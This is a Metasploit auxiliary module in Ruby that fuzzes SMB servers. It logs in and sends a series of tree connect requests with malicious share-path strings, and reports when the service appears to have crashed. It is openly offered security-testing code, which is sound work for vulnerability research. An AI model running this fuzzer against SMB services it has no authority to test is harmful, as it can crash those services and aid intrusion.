##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::SMB
  include Msf::Auxiliary::Fuzzer

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'SMB Tree Connect Request Fuzzer',
      'Description'    => %q{
        This module sends a series of SMB tree connect
      requests using malicious strings.
      },
      'Author'         => [ 'hdm' ],
      'License'        => MSF_LICENSE
    ))
  end

  def do_smb_connect(pkt,opts={})
    @connected = false
    connect
    simple.login(
      datastore['SMBName'],
      datastore['SMBUser'],
      datastore['SMBPass'],
      datastore['SMBDomain']
    )

    @connected = true
    simple.connect("\\\\#{datastore['RHOST']}\\#{pkt}")
  end

  def run
    last_str = nil
    last_inp = nil
    last_err = nil

    cnt = 0

    fuzz_strings do |str|
      cnt += 1

      if(cnt % 100 == 0)
        print_status("Fuzzing with iteration #{cnt} using #{@last_fuzzer_input}")
      end

      begin
        do_smb_connect(str, 0.25)
      rescue ::Interrupt
        print_status("Exiting on interrupt: iteration #{cnt} using #{@last_fuzzer_input}")
        raise $!
      rescue ::Exception => e
        last_err = e
      ensure
        disconnect
      end

      if(not @connected)
        if(last_str)
          print_status("The service may have crashed: iteration:#{cnt-1} method=#{last_inp} string=#{last_str.unpack("H*")[0]} error=#{last_err}")
        else
          print_status("Could not connect to the service: #{last_err}")
        end
        return
      end

      last_str = str
      last_inp = @last_fuzzer_input
    end
  end
end
